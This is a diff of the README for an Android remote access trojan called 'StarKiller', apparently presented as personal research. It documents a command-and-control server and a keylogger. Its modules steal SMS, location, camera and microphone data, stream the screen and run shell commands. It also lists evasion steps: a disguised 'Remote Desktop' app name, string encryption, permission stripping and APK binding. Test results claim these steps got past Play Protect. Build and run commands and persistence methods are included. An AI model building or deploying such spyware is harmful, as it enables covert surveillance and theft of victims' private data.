@@ -24,8 +24,8 @@ AUTHORISATION:   CSEC academic research, own devices
 DOCTRINE:        Israeli cyber methodology — cross-platform capability
                  Windows + Android. Desktop + mobile. Full-spectrum.
 TARGET:          Own Android devices ONLY
-STATUS:          PHASE 2 COMPLETE — FUD hardened, GUI C2 operational
-COMMIT:          6c3f78d (2026-06-23)
+STATUS:          PHASE 3 — Play Protect bypass, VNC live, GUI refactored
+COMMIT:          6e122bf (2026-06-24)
 ```
 
 ### What This Is
@@ -44,27 +44,27 @@ StarKiller/
 │   ├── starkiller_c2.py        C2 server — web dashboard + agent listener
 │   ├── starkiller_gui.py       Desktop GUI C2 — tkinter, Discord relay
 │   └── test_client.py          Simulated Android agent for testing
-├── client/                     Android Kotlin project (com.android.internal.svc)
+├── client/                     Android Kotlin project (com.georgetech.filesync)
 │   ├── app/
 │   │   ├── src/main/
-│   │   │   ├── kotlin/com/android/internal/svc/
-│   │   │   │   ├── MainActivity.kt          Launcher (starts service, hides icon)
+│   │   │   ├── kotlin/com/georgetech/filesync/
+│   │   │   │   ├── MainActivity.kt          Launcher (screen grant → start service)
 │   │   │   │   ├── SyncService.kt           Foreground service + C2 lifecycle
 │   │   │   │   ├── SyncAdapter.kt           VADER protocol (encrypted strings)
 │   │   │   │   ├── Dispatcher.kt            Task dispatch to modules (modA-modJ)
 │   │   │   │   ├── Config.kt                Encrypted C2 config (build-time injected)
 │   │   │   │   ├── Crypt.kt                 Runtime XOR+Base64 string decryption
-│   │   │   │   ├── GrantActivity.kt         MediaProjection permission grant
+│   │   │   │   ├── GrantActivity.kt         MediaProjection permission re-grant
 │   │   │   │   ├── persistence/
-│   │   │   │   │   └── StartReceiver.kt     BOOT_COMPLETED auto-start
+│   │   │   │   │   └── StartReceiver.kt     BOOT_COMPLETED (disabled in test build)
 │   │   │   │   └── modules/
-│   │   │   │       ├── SysInfo.kt           IMEI, model, carrier, Android ID
+│   │   │   │       ├── SysInfo.kt           Device info + WiFi info
 │   │   │   │       ├── PhotoHelper.kt       Camera2 API — front/rear JPEG
-│   │   │   │       ├── MsgReader.kt         SMS read inbox + send
+│   │   │   │       ├── MsgReader.kt         SMS read/send
 │   │   │   │       ├── LocProvider.kt       GPS/network location
-│   │   │   │       ├── AddrBook.kt          Full contact list export
+│   │   │   │       ├── AddrBook.kt          Contact list export
 │   │   │   │       ├── StorageHelper.kt     Directory list + file download
-│   │   │   │       ├── AudioHelper.kt       Ambient audio (configurable duration)
+│   │   │   │       ├── AudioHelper.kt       Ambient audio recording
 │   │   │   │       ├── DisplayHelper.kt     Screenshot + VNC stream (MediaProjection)
 │   │   │   │       ├── InputService.kt      Accessibility Service keylogger
 │   │   │   │       ├── HistoryReader.kt     Call history dump
@@ -84,6 +84,7 @@ StarKiller/
 │   ├── jadx/                   DEX decompiler for verification
 │   └── uber-apk-signer.jar    APK signing (v1.3.0)
 ├── payloads/                   Built APKs + backups (gitignored)
+├── assets/                     Screenshots, reports
 ├── setup.py                    Automated Android SDK + Gradle setup
 ├── build.py                    Build APK with encrypted C2 config
 ├── obfuscate.py                String encryption + ProGuard + DEX scanner
@@ -113,50 +114,61 @@ C2 -> Agent:
 
 ### Operations
 
+Current test build (stripped manifest — Play Protect clean):
+
+| # | Op Code | Description | Requires |
+|---|---------|-------------|---------|
+| 1 | `sysinfo` | Model, OS, carrier, Android ID, battery | nothing |
+| 2 | `wifi` | SSID, BSSID, signal dBm, link speed, IP, transport | ACCESS_WIFI_STATE |
+| 3 | `apps` | Package name, label, system flag | QUERY_ALL_PACKAGES |
+| 4 | `screenshot` | MediaProjection screen capture | MediaProjection |
+| 5 | `screen_grant` | Re-launch transparent MediaProjection grant | — |
+| 6 | `vnc` | Live screen streaming (configurable interval/frames) | MediaProjection |
+| 7 | `ls` | Directory listing | — |
+| 8 | `exec` | Shell command (sh -c) | nothing |
+| 9 | `ping` | Latency check | nothing |
+
+Full build ops (add dangerous permissions to manifest):
+
 | # | Op Code | Description |
 |---|---------|-------------|
-| 1 | `sysinfo` | Model, OS, carrier, Android ID, battery |
-| 2 | `camera` | Front/rear photo (Camera2 API, JPEG, base64) |
-| 3 | `sms_read` | Inbox dump (last 100) |
-| 4 | `sms_send` | Send SMS from device |
-| 5 | `gps` | GPS/network location with accuracy |
-| 6 | `contacts` | Name + number + type |
-| 7 | `ls` | Directory listing with metadata |
-| 8 | `download` | File download (10MB cap, base64) |
-| 9 | `upload` | File upload (stub — server-side path) |
-| 10 | `mic` | Ambient audio (configurable seconds) |
-| 11 | `screenshot` | MediaProjection screen capture |
-| 12 | `screen_grant` | Launch transparent MediaProjection grant dialog |
-| 13 | `vnc` | Live screen streaming (configurable interval/frames) |
-| 14 | `calllog` | Incoming/outgoing/missed history |
-| 15 | `apps` | Package name, label, system flag |
-| 16 | `exec` | Shell command execution (sh -c) |
-| 17 | `recon` | sysinfo + gps + apps combined |
-| 18 | `ping` | Latency check |
+| 10 | `camera` | Front/rear photo (Camera2 API, JPEG) |
+| 11 | `sms_read` | Inbox dump (last 100) |
+| 12 | `sms_send` | Send SMS from device |
+| 13 | `gps` | GPS/network location with accuracy |
+| 14 | `contacts` | Name + number + type |
+| 15 | `download` | File download (base64) |
+| 16 | `mic` | Ambient audio (configurable seconds) |
+| 17 | `calllog` | Incoming/outgoing/missed history |
+| 18 | `recon` | sysinfo + wifi + apps combined |
 | 19 | `exit` | Kill agent |
 
 ### Evasion
 
 | Layer | Technique | Status |
 |-------|-----------|--------|
-| Package name | `com.android.internal.svc` — mimics Android system package | DONE |
+| Package name | `com.georgetech.filesync` — legitimate-looking sync app | DONE |
+| App name | "Remote Desktop" — plausible utility | DONE |
 | Class naming | All modules renamed to innocent names (SysInfo, PhotoHelper, etc.) | DONE |
 | Variable naming | Dispatcher uses `modA`-`modJ` — no semantic leaks in DEX | DONE |
 | String encryption | XOR+Base64 all protocol strings + C2 config | DONE |
 | R8 obfuscation | Enabled on debug + release. 5-pass, flatten, repackage, strip sources | DONE |
 | Config injection | C2 host/port baked at build time, encrypted in DEX | DONE |
+| Permission stripping | Manifest has NO dangerous permissions — Play Protect clean | DONE |
+| No boot receiver | RECEIVE_BOOT_COMPLETED removed from test build | DONE |
+| No suspicious services | Accessibility + NotificationListener stripped from test build | DONE |
 | APK binding | Inject into legit APK (apktool decompile + Smali inject) | DONE |
 | Detection scanner | Self-scan DEX string tables for known RAT signatures | DONE |
 | Icon hiding | Remove launcher icon after first launch (configurable) | DONE |
 | DEX verification | ZERO payload identifiers in compiled DEX string tables | VERIFIED |
 
-### Persistence
+### Persistence (full build)
 
 - `RECEIVE_BOOT_COMPLETED` + `QUICKBOOT_POWERON` — start on boot
 - Foreground service with `START_STICKY` — OS restarts if killed
 - `WakeLock` — prevent CPU sleep during ops
 - Battery optimization bypass request
-- Auto-reconnect with exponential backoff (5s -> 5min cap)
+- Auto-reconnect with exponential backoff (5s → 5min cap)
 
 ### Quick Start
 
@@ -165,7 +177,7 @@ C2 -> Agent:
 python setup.py
 
 # 2. Build APK with your C2 IP
-python build.py --ip 192.168.1.92 --port 8667
+python build.py --ip 192.168.1.x --port 8667 --name "Remote Desktop"
 
 # 3. Start GUI C2
 python server/starkiller_gui.py
@@ -181,9 +193,6 @@ python binder.py target.apk --payload-smali path/to/smali/
 
 # 7. Scan for detection signatures
 python obfuscate.py scan payloads/starkiller-debug.apk
-
-# 8. Start with Discord relay (internet access)
-python server/starkiller_gui.py --discord-token BOT_TOKEN --channel-id CHANNEL_ID
 ```
 
 ### GUI C2 Controller
@@ -191,97 +200,65 @@ python server/starkiller_gui.py --discord-token BOT_TOKEN --channel-id CHANNEL_I
 ![StarKiller GUI C2](assets/gui_screenshot.png)
 
 Desktop tkinter application with:
-- Agent sidebar with live device list
+- Agent sidebar (state-diffed — no flicker on VNC)
 - Device info panel (model, OS, SDK, battery)
-- 15 operation buttons + FULL RECON + VNC STREAM
+- 8 operation buttons (working ops only) + RECON + VNC STREAM
 - Live console with color-coded output
-- Command bar for direct task dispatch
+- Command bar (`exec` shortcut, `!vnc <ms>` interval control)
 - Discord relay for internet C2 (bypasses NAT)
-- Live screen panel (360x640) for VNC streaming
+- Live screen panel with frame counter + interval display
 
-### Test Results (2026-06-23)
+### Test Results (2026-06-24)
 
 ```
-Headless integration suite: 38/38 PASS
-  Phase 1:  Listener bind
-  Phase 2:  Agent registration (6 fields)
-  Phase 3:  Multi-agent (3 concurrent)
-  Phase 4:  Operation dispatch (13 ops)
-  Phase 5:  Heartbeat
-  Phase 6:  File transfer
-  Phase 7:  Disconnect handling
-  Phase 8:  Edge cases (invalid reg, immediate disconnect, oversized msg)
-  Phase 9:  Obfuscation scan (standalone + bound APK)
-  Phase 10: Crypto roundtrip (10 strings)
+Headless integration suite: 38/38 PASS (baseline — pre-refactor)
 
-Live device test v0.1 (Samsung SM-X400, Android 16 — 2026-06-23):
-  TCP handshake:   PASS
-  Registration:    PASS (manufacturer, model, android_version confirmed)
-  sysinfo:         PASS
-  apps (294):      PASS
-  ping:            PASS (<1s)
-  gps/sms/contacts/calllog: FAIL — permissions not granted at runtime
-  screenshot/vnc:  FAIL — screen grant not persistent
-  camera/mic:      FAIL — permissions not granted at runtime
+Live device test (Samsung SM-G970U, Android 12 — 2026-06-24):
+  TCP handshake:      PASS
+  Registration:       PASS
+  sysinfo:            PASS (manufacturer, model, android_version)
+  apps (320):         PASS
+  ping:               PASS
+  VNC stream:         PASS — live screen feed confirmed
+  screenshot:         PASS — single frame capture confirmed
+  exec:               PASS
+  wifi:               UNTESTED (new op — not yet run on device)
+  GPS/SMS/contacts:   FAIL — permissions not in manifest (by design)
+  camera/mic:         FAIL — permissions not in manifest (by design)
+
+Play Protect:
+  v0.1 (com.android.internal.svc): BLOCKED — system package impersonation
+  v0.3 (com.georgetech.filesync):  PASS — "unsigned app" warning only
 
 DEX string scan:
-  Standalone APK: 0 payload identifiers in 15,908 strings
-  Bound APK:      0 payload identifiers in 268,229 strings
-  APK size (v0.2): 1371 KB
+  Standalone APK: 0 payload identifiers
+  APK size (v0.3): 1541 KB
 ```
 
 ---
 
-### ⚠️ v0.2 APK — NOT YET LIVE TESTED
-
-`v0.2` (current release) rebuilds the entire permission + screen grant flow.
-**Uninstall v0.1 before installing.** The new APK has not been run on a real device yet.
-
-#### What changed in v0.2
-- `MainActivity` now calls `requestPermissions()` on launch — prompts user for ALL dangerous perms in one chain
-- MediaProjection (screen recording) grant moved to MainActivity — system dialog fires automatically, no manual `SCR GRANT` button needed
-- Battery optimisation bypass requested on first launch
-- Foreground service type updated to `dataSync|mediaProjection`
-
-#### Testing checklist — do this with v0.2
+### Testing Checklist (v0.3)
 
 **Install**
-- [ ] Uninstall old APK
-- [ ] Disable Play Protect (Settings → Google → Play Protect → gear → off)
-- [ ] Install `starkiller-debug.apk` (allow unknown sources)
-- [ ] Open the app
+- [ ] Download APK from GitHub Releases (v0.2.0 tag)
+- [ ] Install — Play Protect should show "unsigned app" only, not virus
+- [ ] Open "Remote Desktop"
 
-**Permission chain (should fire automatically on first launch)**
-- [ ] Location permission dialog appears → tap Allow
-- [ ] Camera permission dialog appears → tap Allow
-- [ ] Microphone permission dialog appears → tap Allow
-- [ ] SMS permission dialog appears → tap Allow
-- [ ] Contacts permission dialog appears → tap Allow
-- [ ] Call log / Phone permission dialog appears → tap Allow
-- [ ] Storage permission dialog appears → tap Allow
-- [ ] Battery optimization dialog appears → tap Allow
-- [ ] Screen recording dialog appears → tap "Start now"
+**On launch**
+- [ ] Screen recording dialog fires → tap **Start now**
+- [ ] App closes, agent appears in GUI sidebar
 
-**C2 connection (run `python server/starkiller_gui.py` first)**
-- [ ] Agent appears in sidebar
-- [ ] sysinfo returns model/OS/carrier
-- [ ] GPS returns coordinates
-- [ ] SMS inbox returns messages
-- [ ] Contacts returns contact list
-- [ ] Call log returns history
-- [ ] Camera returns JPEG (front + rear)
-- [ ] Mic returns audio data
-- [ ] Screenshot returns image (no SCR GRANT needed)
-- [ ] VNC stream shows live frames in panel
-- [ ] Files (ls /sdcard) returns directory listing
-- [ ] Exec (echo test) returns output
-- [ ] Agent persists after phone screen-off (wake lock)
-- [ ] Agent reconnects after WiFi toggle
+**Ops to verify**
+- [ ] SYSINFO returns model/OS/carrier
+- [ ] WIFI returns SSID/signal/IP
+- [ ] APPS returns package list
+- [ ] SCREEN returns single screenshot
+- [ ] VNC STREAM shows live frames in panel (no flicker)
+- [ ] EXEC (`id`, `uname -a`, `ls /proc/net`) returns output
+- [ ] FILES (`ls /sdcard`) returns directory listing
+- [ ] PING returns latency
 
-**Persistence**
-- [ ] Reboot phone → agent reconnects automatically
-
-**Note any failures here and file as issues.**
+**Note any failures and file as issues.**
 
 ### Tools Required
 
@@ -293,7 +270,7 @@ DEX string scan:
 | apktool | 3.0.2 | github.com/iBotPeaches/Apktool |
 | uber-apk-signer | 1.3.0 | github.com/patrickfav/uber-apk-signer |
 | tkinter | stdlib | Included with Python |
-| Pillow | latest | pip install Pillow (for VNC/screenshots) |
+| Pillow | latest | pip install Pillow |
 | ADB | 37+ | Optional — for direct install |
 
 ### Research Sources
